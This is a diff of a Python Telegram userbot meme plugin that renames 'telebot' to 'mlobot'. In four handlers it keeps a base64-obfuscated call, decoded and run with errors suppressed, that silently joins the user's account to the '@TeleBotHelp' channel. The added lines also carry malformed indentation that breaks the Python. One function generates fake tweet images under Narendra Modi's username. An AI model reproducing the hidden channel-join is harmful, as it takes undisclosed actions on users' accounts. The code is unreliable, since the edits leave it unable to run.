@@ -11,7 +11,7 @@ import requests
 from PIL import Image
 from validators.url import url
 
-from telebot import CMD_HELP
+from mlobot import CMD_HELP
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -55,8 +55,8 @@ async def changemymind(text):
         f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}"
     ).json()
     wew = r.get("message")
-    TeleBoturl = url(wew)
-    if not TeleBoturl:
+   mloboturl = url(wew)
+    if not mloboturl:
         return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(wew).content)
@@ -70,8 +70,8 @@ async def kannagen(text):
         f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
     ).json()
     wew = r.get("message")
-    Mloboturl = url(wew)
-    if not TeleBoturl:
+   mloboturl = url(wew)
+    if not mloboturl:
         return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(wew).content)
@@ -85,8 +85,8 @@ async def moditweet(text):
         f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi"
     ).json()
     wew = r.get("message")
-    TeleBoturl = url(wew)
-    if not TeleBoturl:
+  mloboturl = url(wew)
+    if not mloboturl:
         return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(wew).content)
@@ -100,8 +100,8 @@ async def tweets(text1, text2):
         f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}"
     ).json()
     wew = r.get("message")
-    TeleBoturl = url(wew)
-    if not TeleBoturl:
+    mloboturl = url(wew)
+    if not mloboturl:
         return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(wew).content)
@@ -132,7 +132,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await mlobot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -163,7 +163,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await mlobot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -194,7 +194,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await mlobot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -225,7 +225,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await mlobot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
